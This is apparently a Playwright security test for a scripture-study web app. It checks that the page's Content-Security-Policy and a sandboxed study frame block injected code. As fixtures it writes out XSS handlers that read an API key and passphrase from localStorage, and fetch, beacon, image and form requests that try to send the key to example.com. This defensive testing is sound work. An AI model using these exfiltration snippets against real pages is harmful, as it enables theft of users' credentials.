// csp: the page's Content-Security-Policy (index.html) pins what the app can reach and run.
// The app itself raises no violation (home, a chapter, a search, a study page). A stray
// <img onerror> or script in library HTML cannot run, so it cannot read the API key; a fetch or
// an image request to another host is refused before it leaves, while Claude's address is let
// through. A study page still runs its own scripts, in its sandboxed frame, where storage is
// refused, and under the frame's own policy it can reach no other host: not with a fetch, not
// with an image, not with a form (the sandbox allows none). The app's line above the frame
// says the page is not the app's. And study-frame.html, opened outside the sandbox, writes nothing.
import fs from "node:fs";

export default async function run(browser, { BASE, PASS, SHOTS }) {
  const errors = [];
  const check = (c, m) => { if (!c) errors.push(m); };
  const ctx = await browser.newContext({ viewport: { width: 1180, height: 820 } });
  await ctx.addInitScript(() => {
    try { localStorage.setItem("gospel.apiKey", JSON.stringify("sk-ant-test-not-a-key")); } catch (_) {}
    window.__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
    window.addEventListener("message", (e) => { if (e.data && e.data.type === "probe") window.__probe = e.data; if (e.data && e.data.type === "probe-net") window.__net = e.data.out; });
  });
  // every request that leaves for another host is counted; Claude's address answers
  const left = [];
  await ctx.route((u) => u.hostname !== new URL(BASE).hostname, (route) => {
    left.push(route.request().url());
    return route.fulfill({ status: 200, headers: { "access-control-allow-origin": "*", "access-control-allow-headers": "*" }, contentType: "application/json", body: "{}" });
  });
  const page = await ctx.newPage();
  page.on("pageerror", (e) => errors.push(`pageerror: ${e}`));
  await page.goto(BASE);
  await page.fill("div.setup input", PASS);
  await page.press("div.setup input", "Enter");
  await page.waitForSelector("#homeBody .shelf-grid", { timeout: 120000 });
  check((await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content || "")).includes("connect-src 'self' https://api.anthropic.com"), "index.html carries no policy");

  // the app at work: a search (the engine, the model), a chapter, a study page
  await page.fill("#q", "faith is not to have a perfect knowledge");
  await page.press("#q", "Enter");
  await page.waitForSelector("#list .hit, #list .result, #list article", { timeout: 20000 }).catch(() => {});
  const alma = await page.evaluate(async () => (await GL.api("search", { q: "Alma 32:21", limit: 1 })).jump);
  await page.evaluate((id) => GL.openDoc(id), alma.doc_id);
  await page.waitForSelector("#reader .doc .verse", { timeout: 10000 });
  await page.waitForTimeout(500);
  check((await page.evaluate(() => window.__csp)).length === 0, `the app itself broke its policy: ${(await page.evaluate(() => window.__csp)).join("; ")}`);

  // library HTML with a handler and a script in it, as if the reader's sanitizer had missed them
  await page.evaluate(() => {
    const holder = document.createElement("div");
    holder.innerHTML = `<img id="evil" src="data:image/png;base64,AAAA" onerror="window.__stolen = localStorage.getItem('gospel.apiKey')"><a id="evil2" href="#" onclick="window.__stolen2 = localStorage.getItem('gospel.passphrase')">x</a>`;
    document.querySelector("#reader .doc").append(holder);
    const s = document.createElement("script");
    s.textContent = "window.__stolen3 = localStorage.getItem('gospel.apiKey')";
    document.querySelector("#reader .doc").append(s);
    document.querySelector("#evil2").click();
  });
  await page.waitForTimeout(500);
  const stolen = await page.evaluate(() => [window.__stolen, window.__stolen2, window.__stolen3, window.__csp.join("; ")]);
  check(stolen[0] === undefined && stolen[1] === undefined && stolen[2] === undefined, `an injected handler or script ran and read storage: ${JSON.stringify(stolen.slice(0, 3))}`);
  check(/script-src/.test(stolen[3]), `no script violation was reported: ${stolen[3]}`);

  // nothing goes to another host: not a fetch, not a beacon, not an image address
  left.length = 0;
  const sent = await page.evaluate(async () => {
    const key = localStorage.getItem("gospel.apiKey");
    const out = {};
    out.fetch = await fetch("https://example.com/take", { method: "POST", body: key }).then(() => "sent", (e) => `refused: ${e.name}`);
    out.nocors = await fetch("https://example.com/take?k=" + encodeURIComponent(key), { mode: "no-cors" }).then(() => "sent", (e) => `refused: ${e.name}`);
    try { out.beacon = navigator.sendBeacon("https://example.com/beacon", key); } catch (e) { out.beacon = `refused: ${e.name}`; }
    out.img = await new Promise((done) => { const i = new Image(); i.onload = () => done("loaded"); i.onerror = () => done("refused"); i.src = "https://example.com/p.gif?k=" + encodeURIComponent(key); });
    out.claude = await fetch("https://api.anthropic.com/v1/messages", { method: "POST", body: "{}" }).then((r) => `reached ${r.status}`, (e) => `refused: ${e.name}`);
    return out;
  });
  await page.waitForTimeout(300);
  check(/^refused/.test(sent.fetch) && /^refused/.test(sent.nocors) && sent.img === "refused", `a request to another host was not refused: ${JSON.stringify(sent)}`);
  check(sent.claude === "reached 200", `Claude's address was not let through: ${sent.claude}`);
  check(left.every((u) => u.startsWith("https://api.anthropic.com/")), `requests left for another host: ${left.join(", ")}`);
  check((await page.evaluate(() => window.__csp.filter((v) => /^connect-src https:\/\/example\.com/.test(v)).length)) >= 2, "the refused fetches were not reported as connect-src");

  // a study page: its own script runs, its handler runs, and neither can see the app's storage
  const file = `${SHOTS}csp-probe.html`;
  fs.writeFileSync(file, `<!doctype html><html><head><title>Probe page</title></head><body><h1>Probe page</h1>
<script>window.ran = "own script ran";
window.out = {};
fetch("https://example.com/take", { method: "POST", body: "typed" }).then(function () { window.out.fetch = "sent"; }, function (e) { window.out.fetch = "refused"; });
fetch("https://example.com/take?k=typed", { mode: "no-cors" }).then(function () { window.out.nocors = "sent"; }, function (e) { window.out.nocors = "refused"; });
var im = new Image(); im.onload = function () { window.out.img = "loaded"; }; im.onerror = function () { window.out.img = "refused"; }; im.src = "https://example.com/p.gif?k=typed";
var dot = new Image(); dot.onload = function () { window.out.data = "loaded"; }; dot.onerror = function () { window.out.data = "refused"; }; dot.src = "data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==";
setTimeout(function () { parent.postMessage({ type: "probe-net", out: window.out }, "*"); }, 1200);
</script>
<form id="f" action="https://example.com/form" method="post"><input name="passphrase" value="typed"></form>
<script>try { document.getElementById("f").submit(); } catch (e) {}</script>
<img src="nothing-here.png" onerror="var v, p; try { v = 'READ ' + localStorage.getItem('gospel.apiKey'); } catch (e) { v = 'REFUSED ' + e.name; } try { p = 'READ ' + parent.localStorage.getItem('gospel.apiKey'); } catch (e) { p = 'REFUSED ' + e.name; } parent.postMessage({ type: 'probe', own: v, parents: p, ran: window.ran, origin: self.origin }, '*')">
</body></html>`);
  await page.evaluate(() => { location.hash = ""; });
  await page.click("#homeBtn");
  await page.locator("#homeBody .shelf-tile:has-text('My studies')").click();
  await page.waitForSelector(".studies-add .primary");
  left.length = 0;
  await page.setInputFiles("#homeBody input[type=file]", file);
  await page.waitForSelector("#reader .study-frame", { timeout: 20000 });
  await page.waitForFunction(() => !!window.__probe, null, { timeout: 8000 }).catch(() => {});
  const probe = await page.evaluate(() => window.__probe || null);
  check(!!probe, "the study page's handler did not run (its scripts should, inside the frame)");
  if (probe) {
    check(probe.ran === "own script ran", "the study page's own script did not run");
    check(/^REFUSED/.test(probe.own) && /^REFUSED/.test(probe.parents) && probe.origin === "null", `the study page could see storage: ${JSON.stringify(probe)}`);
  }
  check((await page.frameLocator("#reader .study-frame").locator("h1").textContent().catch(() => "")) === "Probe page", "the study page did not show");
  // the study page reaches no other host, and the app says whose page it is
  await page.waitForFunction(() => !!window.__net, null, { timeout: 8000 }).catch(() => {});
  const net = await page.evaluate(() => window.__net || null);
  check(!!net && net.fetch === "refused" && net.nocors === "refused" && net.img === "refused", `a study page reached another host: ${JSON.stringify(net)}`);
  check(!!net && net.data === "loaded", `a picture held in the study page itself should still show: ${JSON.stringify(net)}`);
  check(left.length === 0, `requests left a study page for another host: ${left.join(", ")}`);
  check((await page.frameLocator("#reader .study-frame").locator("h1").textContent().catch(() => "")) === "Probe page", "the study page's form took the frame somewhere");
  check((await page.getAttribute("#reader .study-frame", "sandbox")) === "allow-scripts", "the study frame's sandbox allows more than scripts");
  const strip = await page.evaluate(() => { const s = document.querySelector("#reader .study-own"), f = document.querySelector("#reader .study-frame"); return s ? { text: s.textContent, above: s.getBoundingClientRect().bottom <= f.getBoundingClientRect().top + 1, h: Math.round(s.getBoundingClientRect().height) } : null; });
  check(!!strip && /^Your own page\. It is not part of the app; never type a passphrase or key into it\.$/.test(strip.text) && strip.above && strip.h <= 30, `the line above a study page: ${JSON.stringify(strip)}`);
  await page.screenshot({ path: `${SHOTS}csp-study.png` });
  await page.evaluate(async () => { for (const s of await Studies.list()) await Studies.remove(s.id); });

  // the frame's page opened on its own has the app's origin: it must write nothing it is sent
  const bare = await ctx.newPage();
  await bare.goto(new URL("study-frame.html", BASE).href);
  await bare.evaluate(() => { window.postMessage({ type: "gospel:page", html: "<script>window.pwned = 1<\/script><p id='in'>in</p>" }, "*"); });
  await bare.waitForTimeout(300);
  check(await bare.evaluate(() => window.pwned === undefined && !document.querySelector("#in")), "study-frame.html, opened outside its sandbox, wrote what it was sent");
  await bare.close();

  await ctx.close();
  return errors;
}
